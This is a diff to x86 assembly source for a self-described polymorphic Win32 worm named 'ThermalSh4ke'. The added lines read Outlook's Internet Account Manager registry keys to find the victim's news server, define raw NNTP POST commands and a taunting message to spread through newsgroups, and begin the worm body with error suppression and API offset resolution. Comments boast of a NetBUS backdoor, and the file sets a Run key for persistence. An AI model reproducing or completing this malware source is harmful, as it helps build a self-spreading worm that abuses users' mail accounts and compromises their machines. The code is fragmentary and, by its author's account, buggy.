@@ -6,7 +6,7 @@
 ;;    is one of my first ever polymorphic generic malware for the Win32.
 ;;    As it is a perfect opporunity to show my BlaCk-H@ skillzz. xD.
 ;;    HoweveR, Im still a n0ob in asm sO the C0de mighT be buggY. However,
-;;    The worm body is ****still unfinished****, so don't expect much!
+;;    The worm body is still unfinished, so don't expect much!
 ;;
 ;; General sheet of characteristics:
 ;;    Name of the virus.............: Win32.ThermalSh4ke
@@ -143,3 +143,48 @@ WIN_INI_RUN_KEY             DB      "run", 0
 WIN_SECTION                 DB      "windows", 0
 RUN_KEY                     DB      "Software\Microsoft\CurrentVersion\Run", 0
 
+REG_HANDLE_1                DD      0
+REG_HANDLE_2                DD      0                
+SZ_ACCOUNT_MGR              DB      "Software\Microsoft\Internet Account Manager", 0
+ACCOUNT_KEY                 DB      "Software\Microsoft\Internet Account Manager\Accounts\"
+ACCOUNT_INDEX               DB      "00000000", 0
+SZ_DEF_NEWS_ACC             DB      "Default News Account", 0
+SZ_NNTP_SERVER              DB      "NNTP Server", 0
+
+SIZE_ACCOUNT_BUFFER         DD      9
+SIZE_NNTP_BUFFER            DD      128
+
+S_POST                      DB      "POST", 0Dh, 0Ah
+S_QUIT                      DB      "QUIT", 0Dh, 0Ah
+
+;; Definition of ThermalShake Generation 2 in Outlook. Here
+;; resides his malware-header... 
+NEWS_MESSAGE                DB      "From: 'HaZzeL' <heaven@rainbow.pony>", 0Dh, 0Ah
+                            DB      "Subject: ThermalShake was here... xD", 0Dh, 0Ah
+                            DB      "Newsgroups: heaven.ponyfoo", 0Dh, 0Ah
+                            DB      0Dh, 0Ah
+                            DB      "HeYy y0u stuPid uSer...", 0Dh, 0Ah
+                            DB      "y0uR S3cuRitY is hella bAd xD. Pleas3 st0p hAvIng Fun & stArt fiXing your SoftW4re!", 0Dh, 0Ah
+                            DB      "ThermalShake was here... Next T1me Stop play!ng aroUnd wiTh aggressive M4lware", 0Dh, 0Ah
+                            DB      "Greetzz: HaZzel xD", 0Dh, 0Ah
+                            DB      ".", 0Dh, 0Ah
+END_NEWS_MESSAGE:
+
+;; Begin of real horror... This section contains all the worm body 
+;; that includes thze polymorphic engine and the 31st technique as well
+;; as thze NetBUS/NezBIOS backdoor. Have fun :D
+.CODE
+DB          "[-T2IR-]"", 0
+PUSH        SEM_NOGPFAULTERRORBOX   ;; On error, just swim further
+CALL        SetErrorMode            ;; Whithout having a junk
+
+PUSH        0
+PUSH        0
+PUSH        0
+PUSH        0
+PUSH        0
+CALL        PeekMessageA
+
+;; Get the real offset from CreateFileA in the jmp-table
+MOV         ESI, DWORD PTR CreateFileA+2
+LODSD
